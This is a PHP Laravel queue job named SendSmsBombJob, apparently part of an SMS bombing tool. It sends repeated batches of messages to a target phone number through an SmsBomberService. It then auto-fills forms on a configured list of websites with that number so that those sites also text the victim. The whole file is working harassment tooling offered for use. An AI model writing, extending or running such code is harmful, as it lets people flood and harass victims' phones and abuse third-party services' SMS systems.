<?php

namespace App\Jobs;

use App\Services\AutoFillerRunner;
use App\Services\SmsBomberService;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Log;

class SendSmsBombJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    public string $phone;
    public int $batchSize;
    public int $totalBatches;
    public int $intervalMinutes;
    public int $timeout;

    public function __construct(string $phone, int $batchSize, int $totalBatches = 1, int $intervalMinutes = 0)
    {
        $this->phone = $phone;
        $this->batchSize = $batchSize;
        $this->totalBatches = $totalBatches;
        $this->intervalMinutes = $intervalMinutes;
        $this->timeout = max(1200, (int) config('autofill.sms_job_timeout', 18000));
    }

    public function handle(SmsBomberService $service, AutoFillerRunner $autoFiller)
    {
        $result = $service->sendBomb($this->phone, $this->batchSize, $this->totalBatches, $this->intervalMinutes);

        if (isset($result['error'])) {
            Log::info('SMS bomb skipped/failed', [
                'phone' => $this->phone,
                'batch_size' => $this->batchSize,
                'total_batches' => $this->totalBatches,
                'interval_minutes' => $this->intervalMinutes,
                'error' => $result['error'],
            ]);
        }

        $sites = config('autofill.sms_sites', []);
        if (!empty($sites)) {
            $name = (string) config('autofill.name', 'Test User');
            $sleepUs = (int) config('autofill.sleep_us', 100000);
            $debug = (bool) config('autofill.debug', false);

            try {
                $autofillResult = $autoFiller->run($sites, $name, $this->phone, $sleepUs, $debug);
                Log::info('SMS autofill completed', [
                    'phone' => $this->phone,
                    'sites' => count($sites),
                    'stats' => $autofillResult['stats'] ?? null,
                    'log_path' => $autofillResult['log_path'] ?? null,
                ]);
            } catch (\Throwable $e) {
                Log::error('SMS autofill failed', [
                    'phone' => $this->phone,
                    'sites' => count($sites),
                    'error' => $e->getMessage(),
                ]);
            }
        }
    }
}
